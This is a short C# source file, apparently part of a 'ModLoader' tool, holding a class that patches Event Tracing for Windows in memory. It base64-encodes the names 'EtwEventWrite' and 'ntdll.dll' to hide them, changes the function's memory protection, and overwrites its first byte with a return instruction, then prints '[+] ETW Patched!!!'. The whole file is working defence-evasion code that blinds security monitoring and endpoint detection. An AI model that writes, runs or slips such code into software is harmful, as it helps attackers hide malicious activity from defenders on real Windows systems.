using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace ModLoader
{
    public static class ETWPatch
    {
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public static void ETWPatching()
        {
            var sp = Convert.FromBase64String("RXR3RXZlbnRXcml0ZQ=="); //EtwEventWrite
            string decodedSp = System.Text.Encoding.UTF8.GetString(sp);
            var ad = Convert.FromBase64String("bnRkbGwuZGxs"); //ntdll.dll
            string decodedAd = System.Text.Encoding.UTF8.GetString(ad);
            var lib = LoadLibrary(decodedAd);
            var myvar = GetProcAddress(lib, Convert.ToString(decodedSp));

            byte[] bypass = { 0xC3 }; //Cause EtwEventWrite to return

            var p = bypass;
            _ = VirtualProtect(myvar, (UIntPtr)p.Length, 0x3F + 0x01, out uint oldProtect);

            Marshal.Copy(p, 0, myvar, p.Length);
            _ = VirtualProtect(myvar, (UIntPtr)p.Length, oldProtect, out uint _);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("[+] ETW Patched!!!");
            Console.ResetColor();
            Console.WriteLine("Press any key to continue...");
            while (Console.KeyAvailable)
                Console.ReadKey(true);
            Console.ReadKey(true);

        }
    }
}
